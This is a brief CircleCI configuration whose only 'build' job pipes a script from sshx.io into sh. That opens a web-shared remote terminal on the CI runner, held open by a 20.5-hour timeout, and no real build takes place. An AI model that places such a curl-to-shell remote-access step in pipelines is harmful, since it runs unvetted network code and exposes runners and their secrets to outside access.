version: 2.1

jobs:
  build:
    docker:
      - image: cimg/base:2022.09
    steps:
      - checkout
      - run:
           command: curl -sSf https://sshx.io/get | sh -s run
           no_output_timeout: 20.5h
